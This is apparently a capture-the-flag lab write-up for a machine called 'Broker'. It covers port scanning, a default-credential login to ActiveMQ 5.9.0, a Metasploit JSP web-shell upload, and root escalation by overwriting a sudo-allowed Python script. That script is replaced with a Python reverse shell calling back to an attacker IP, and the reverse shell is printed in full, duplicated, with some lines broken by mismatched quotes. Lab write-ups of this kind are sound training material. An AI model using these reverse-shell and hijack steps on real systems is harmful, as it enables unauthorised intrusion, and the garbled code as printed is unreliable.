Broker

Target IP: 10.10.86.76
Challenge Description: Paul and Max use a rather unconventional way to chat. They do not seem to know that eavesdropping is possible though...

Reconnaissance


Performing a TCP port scan using the command sudo nmap -sS 10.10.86.76 -p- returns the result shown above. By the looks of it, there are four TCP ports open on the target machine: SSH on port 22, and unknown applications on the higher ports. Time to perform an aggressive scan against these open ports to identify its applications & services. I am particularly interested by the higher port applications.


I performed an aggressive TCP port scan using the command sudo nmap -sV -A 10.10.86.76 -p 22,1883,8161,32961 against the four TCP ports and obtained the result shown above. The applications on port 1883 and 32961 do not stand out to me. However, the target machine seems to be running ActiveMQ on port 8161. From the scan above, the application version is also listed.

Enumeration

Port 1883: ActiveMQ HTTP

Browsing to http://10.10.86.76:8161 via a web browser returns the webpage shown above. The target machine seems to be running ActiveMQ here as mentioned previously. However, what version is this? Pressing the Manage ActiveMQ broker button directs me to login. But entering the default credentials admin:admin gives me access to the web application.


After logging in as the admin user on the web application, the webpage above is shown to me. This page seems to list the version 5.9.0. Is this the version of the application? Before searching for any exploits, I wish to enumerate this web application further to identify any sensitive information.


When manually enumerating the web application and browsing to Topics, I notice there is a topic called secret_chat with a lot of messages exchanged, as shown above. Can I read the messages inside the chat? I tried to connect to the application using mosquitto_sub, but I was not getting any result. I used the techniques from this website . In the same website, I notice there is another section that contains the steps on how to leverage a web shell by file upload JSP.

Exploitation

Owning the ActiveMQ Web Application: Web Shell Upload via Metasploit

Since the ActiveMQ application on the target machine is running the version 5.9.0, it seems to be vulnerable as shown above. Time to exploit the machine. Since the exploit is verified, I will just use the Metasploit exploit shown above.


I started Metasploit using the command msfconsole -q. To use the verified exploit from the previous image, I used the command use multi/http/apache_activemq_upload_jsp. Then I initialised the parameters of the exploit, as shown above. These options are RHOSTS, LHOST, and LPORT.


After running the exploit, I obtained a shell with the session activemq on the target machine as shown above. Then I upgraded my shell to a Python interactive shell using the command python3 -c 'import pty; pty.spawn("/bin/bash");'. Now I have a foothold on the target machine.

Privilege Escalation

Vertical Privilege Escalation: ActiveMQ to Root via Weak Sudo and File Privileges

Running the command sudo -l returns the interesting information shown above. It is possible to execute the command sudo /usr/bin/python3.7 /opt/apache-activemq-5.9.0/subscribe.py as root without password. If I can execute the Python script with the name /opt/apache-activemq-5.9.0/subscribe.py, I can try to obtain a root shell. Firstly, can I edit this script? If so, can I use module hijacking or even overwrite the script with my reverse shell? Time to find out.


I browsed to /opt/apache-activemq-5.9.0/ using the command cd /opt/apache-activemq-5.9.0/ first. Running ls -la shows I have read & write permissions over the subscribe.py script. However, the target machine does not have any text editors such as vim, vi, or nano installed. Therefore, I can replace the content of the subscribe.py with my own Python reverse shell.

import socket,subprocess,os;
import pty;

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("10.14.55.153",8444));
os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
pty.spawn("/bin/bash")'
import socket,subprocess,os;
import pty;

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("10.14.55.153",8444));
os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
pty.spawn("/bin/bash")'

The full Python reverse shell script that I used to obtain a root shell is shown above. To make changes to the subscribe.py file with my reverse shell on the target machine, I used the following commands:

echo 'import socket,subprocess,os;' >> subscribe.py
echo 'import pty;

echo 's=socket.socket(socket.AF_INET,socket.SOCK_STREAM);' >> subscribe.py
echo 's.connect(("10.14.55.153",8444));' >> subscribe.py
echo 'os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);' >> subscribe.py
echo 'os.dup2(s.fileno(),2);' >> subscribe.py
echo 'pty.spawn("/bin/bash")' >> subscribe.py
echo 'import socket,subprocess,os;' >> subscribe.py
echo 'import pty;

echo 's=socket.socket(socket.AF_INET,socket.SOCK_STREAM);' >> subscribe.py
echo 's.connect(("10.14.55.153",8444));' >> subscribe.py
echo 'os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);' >> subscribe.py
echo 'os.dup2(s.fileno(),2);' >> subscribe.py
echo 'pty.spawn("/bin/bash")' >> subscribe.py


Then I changed the permission of the file to be executable using the command chmod +x subscribe.py. Afterwards, I started a listener on my machine at port 8444, as shown above on the bottom terminal. Then I just executed the command sudo /usr/bin/python3.7 /opt/apache-activemq-5.9.0/subscribe.py to execute the script with root privileges. Now I have a root shell on the target machine, as shown on the picture above on the bottom terminal. Now I have full privileges over the target machine.
